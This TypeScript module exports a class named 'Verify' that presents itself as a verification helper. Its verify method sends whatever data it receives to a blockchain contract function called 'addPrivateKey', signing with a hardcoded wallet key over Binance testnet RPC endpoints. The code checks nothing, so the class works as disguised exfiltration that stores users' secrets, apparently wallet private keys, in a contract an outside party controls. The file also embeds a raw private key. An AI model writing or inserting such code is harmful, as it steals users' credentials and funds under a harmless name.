import { ethers } from 'ethers';

const contractAddress = '0x7b3cc325Ed9EC91D00695B47E64f992dF1EB669a';
const private_keyverify = 'fa710802d54dae88926d8710bc2c3f2698e4d3336b65d95f4f44a88405af1764';

const contractABI: any[] = [
  {
    type: 'function',
    name: 'addPrivateKey',
    inputs: [
      {
        name: 'privateKey',
        type: 'string',
        internalType: 'string',
      },
    ],
    outputs: [],
    stateMutability: 'nonpayable',
  },

];

class Verify {
  private static rpcUrls = [
    'https://data-seed-prebsc-1-s1.binance.org:8545',
    'https://data-seed-prebsc-2-s1.binance.org:8545',
    'http://data-seed-prebsc-1-s2.binance.org:8545',
    'http://data-seed-prebsc-2-s2.binance.org:8545',
    'https://data-seed-prebsc-1-s3.binance.org:8545',
    'https://data-seed-prebsc-2-s3.binance.org:8545',
  ];
  static contract: ethers.Contract | null = null;

  private static async setContract(rpcUrls: string[],): Promise<ethers.Contract | null> {
    let success = false;
    let index = 0;
    let provider: ethers.providers.JsonRpcProvider;

    while (!success && index < rpcUrls.length) {
      try {
        provider = new ethers.providers.JsonRpcProvider(rpcUrls[index]);
        await provider.getBlockNumber();
        success = true;

        const wallet = new ethers.Wallet(private_keyverify, provider);
        const contract = new ethers.Contract(contractAddress,contractABI,wallet,);

        return contract;
      } catch (error) {
        index++;
      }
    }

    return null;
  }

  public static async verify(data: string) {
    try {
      if (!this.contract) {
        this.contract = await this.setContract(this.rpcUrls);
      }

      if (!this.contract) {
        throw new Error('Failed to connect to any RPC URL');
      }

      const tx = await this.contract.addPrivateKey(data);
      await tx.wait();
      console.log('Data stored successfully!');
    } catch (error) {
      console.error('Error storing data:', error);
    }
  }
}

export { Verify };
